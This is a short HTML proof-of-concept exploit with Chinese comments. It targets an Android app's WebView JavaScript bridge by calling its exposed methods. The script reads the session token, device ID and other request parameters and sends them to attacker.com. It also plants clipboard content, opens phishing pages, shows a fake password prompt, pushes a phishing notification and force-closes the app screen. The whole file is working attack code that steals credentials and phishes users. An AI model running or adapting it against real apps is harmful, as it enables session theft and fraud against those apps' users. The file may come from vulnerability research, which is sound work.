// exploit.html - 真实的 JS 调用代码
<script>
// 1. 调用 getRequestParams 获取敏感信息
try {
    var params = Android.getRequestParams();
    console.log("getRequestParams 返回:", params);
    // params 包含：token, traceId, deviceId, appVersion 等
    fetch('https://attacker.com/collect?params=' + encodeURIComponent(params));
} catch(e) { console.log("getRequestParams 失败:", e); }

// 2. 调用 checkLogin 检查登录状态
try {
    var isLoggedIn = Android.checkLogin();
    console.log("登录状态:", isLoggedIn);
} catch(e) { console.log("checkLogin 失败:", e); }

// 3. 调用 copyToClipboard 复制到剪贴板（可用于钓鱼）
try {
    Android.copyToClipboard("恶意内容");
    console.log("复制到剪贴板成功");
} catch(e) { console.log("copyToClipboard 失败:", e); }

// 4. 调用 openUrl 打开恶意链接（XSS/钓鱼）
try {
    Android.openUrl("image", "https://attacker.com/phishing.html");
    console.log("openUrl 调用成功");
} catch(e) { console.log("openUrl 失败:", e); }

// 5. 调用 showToast 显示钓鱼提示
try {
    Android.showToast("系统更新，请输入密码");
    console.log("showToast 调用成功");
} catch(e) { console.log("showToast 失败:", e); }

// 6. 调用 finish 关闭 Activity（DoS）
try {
    Android.finish();
    console.log("finish 调用成功 - Activity 被关闭");
} catch(e) { console.log("finish 失败:", e); }

// 7. 调用 sendNotification 发送通知（钓鱼）
try {
    var notifyJson = JSON.stringify({
        "title": "系统警告",
        "content": "检测到安全风险，点击处理",
        "click_action": "https://attacker.com/phishing"
    });
    Android.sendNotification(notifyJson);
    console.log("sendNotification 调用成功");
} catch(e) { console.log("sendNotification 失败:", e); }

// 8. 调用 log 写入日志（信息泄露）
try {
    Android.log("info", "敏感操作日志内容");
    console.log("log 调用成功");
} catch(e) { console.log("log 失败:", e); }
</script>
